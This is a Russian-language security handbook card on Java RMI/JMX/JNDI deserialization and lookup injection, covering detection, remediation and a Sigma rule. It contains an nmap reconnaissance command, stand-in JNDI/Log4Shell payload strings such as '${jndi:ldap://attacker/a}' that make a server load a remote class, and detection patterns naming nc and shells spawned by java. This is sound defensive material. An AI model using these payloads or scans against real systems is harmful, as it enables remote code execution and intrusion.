---
id: deserialization-rmi-jmx-jndi
title: "RMI/JMX/JNDI: удалённая десериализация и lookup-инъекция"
type: deserialization
target: java
category: web
difficulty: advanced
bypass: none
tags: [deserialization, rmi, jmx, jndi, network]
tested_on: ["Java RMI registry 1099", "JMX 9999", "JNDI/LDAP lookup"]
success_rate: 0.4
risk: critical
cwe: "CWE-502"
lab: null
last_verified: "2026-10-23"
references:
  - "https://attack.mitre.org/techniques/T1021/"
graph:
  - target: "deserialization"
    type: instance_of
  - target: "network"
    type: related_to
  - target: "rce"
    type: leads_to
  - target: "log-injection"
    type: related_to
---

# RMI/JMX/JNDI: удалённая десериализация и lookup-инъекция

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
# диагностика: доступен ли RMI-реестр / JMX без аутентификации
nmap -p 1099,9999,4848 --script rmi-dumpregistry,informix-default-port \
     --script-args='' 10.10.10.5
jconsole  # или jmxterm: service:jmx:rmi:///jndi/rmi://10.10.10.5:9999/jmxrmi
```

## Explanation

Java-сервисы управления часто публикуются наружу и принимают сериализованные
объекты от любого клиента:

| Порт | Сервис | Риск |
|------|--------|------|
| 1099 | RMI registry | десериализация аргументов вызова, дамп реестра |
| 9999/8686 | JMX (jmxremote) | MBean-вызовы: `MLet` загружает удалённый класс = RCE |
| 4848 | GlassFish admin | деплой приложения без пароля |
| 1389/389 | LDAP (JNDI lookup) | возврат ссылки на удалённый класс |
| 8080/9090 | Solr/Jenkins и т.п. | десериализация в API |

Два независимых механизма:

1. **Десериализация** аргументов RMI/JMX (те же gadget-цепочки, что и в
   `deser-java-native-gadget`).
2. **JNDI-инъекция**: если приложение делает `InitialContext.lookup(<user_data>)`,
    атакующий указывает `ldap://` или `rmi://` на свой сервер, который возвращает
    ссылку на удалённый класс (исторически; с Java 8u191/11.0.1 `trustURLCodebase=false`
    по умолчанию, но остаются локальные gadget-пути через `BeanFactory`/EL).
    Log4Shell — частный случай именно JNDI-инъекции через логируемое значение.

Готовые цепочки эксплуатации (ysoserial-гаджеты, шеллкод, обфускация) в проекте
не публикуются: карточка описывает **механизм**, признаки и способы защиты.
Для практики используйте лабораторию с известным уязвимым приложением и
публичный инструментарий в изолированной сети.

## Detection

1. Сканирование портов управления: 1099, 9999, 8686, 4848, 9010, 4712.
2. `rmi-dumpregistry` (nmap), `jmxterm`/`jconsole` без учётных данных.
3. В приложении ищите `InitialContext.lookup`, `new InitialDirContext`,
   строки `ldap://`/`rmi://`, собираемые из пользовательских данных.
4. Логи: `javax.naming.NamingException`, исходящие LDAP/RMI-соединения
   от JVM-процесса (это аномалия сама по себе).
5. Java-версия: < 8u191 / < 11.0.1 -> JNDI-загрузка удалённых классов разрешена.
6. Log4j-core < 2.17 + логируемые пользовательские значения = Log4Shell.

## Remediation

- Не публиковать RMI/JMX/JNDI наружу: только loopback или управляющий сегмент
  + mTLS + аутентификация (`com.sun.management.jmxremote.authenticate=true`,
  `password-file` с правами 0600, SSL).
- Java ≥ 8u191/11.0.1 (`com.sun.jndi.ldap.object.trustURLCodebase=false`),
  дополнительно `-Dcom.sun.jndi.rmi.object.trustURLCodebase=false`.
- Никогда не передавать пользовательские данные в `lookup()`; whitelist имен.
- Log4j ≥ 2.17.1, `formatMsgNoLookups`, удаление `JndiLookup` из jar.
- ObjectInputFilter (JEP 290) на всех точках десериализации.
- Egress-фильтрация: JVM не должна ходить в интернет по LDAP/RMI/DNS.
- Мониторинг исходящих JNDI-запросов и появления `MLet`-MBean.

## Variants

```
MLet getMBeansFromURL (JMX -> RCE)
```

```
ldap://attacker/Exploit (JNDI)
```

```
${jndi:ldap://attacker/a} (Log4Shell)
```

## Detection rules

```yaml
title: JNDI/RMI-инъекция — lookup на внешний LDAP/RMI и ${jndi:} в параметрах
id: e5f6a7b8-0115-4e5f-9a7b-000000000115
status: experimental
description: >-
  Приложение выполняет JNDI-lookup по адресу из пользовательских данных
  (ldap://attacker, rmi://) — log4shell-паттерн ${jndi:...} в параметрах,
  CommunicationException с внешним адресом в логах, и процесс java,
  порождающий shell (успешная загрузка гаджета).
references:
  - https://attack.mitre.org/techniques/T1190/
  - https://attack.mitre.org/techniques/T1220/
logsource:
  category: application
  definition: 'логи приложения и access-лог + auditd execve на java-хостах'
detection:
  selection_query:
    cs-uri-query|contains:
      - '${jndi:'
      - 'jndi:ldap'
      - 'jndi:rmi'
      - 'jndi:dns'
  selection_body:
    request_body|contains:
      - '${jndi:'
      - 'ldap://attacker'
      - 'rmi://attacker'
  selection_log:
    error_message|contains:
      - 'javax.naming'
      - 'ldap://attacker'
      - 'rmi://attacker'
      - 'JndiLookup'
  java_shell:
    EventType: EXECVE
    ParentImage|endswith:
      - /java
    Image|endswith:
      - /sh
      - /bash
      - /nc
  condition: selection_query or selection_body or selection_log or java_shell
fields:
  - c-ip
  - cs-uri-query
  - error_message
  - ParentImage
  - Image
falsepositives:
  - легитимные JNDI-lookup на внутренние каталоги (исключайте свои ldap-хосты,
    но никогда — внешние адреса)
level: critical
tags:
  - attack.initial_access
  - attack.t1190
  - attack.t1220
  - cwe.502
  - cwe.917
```
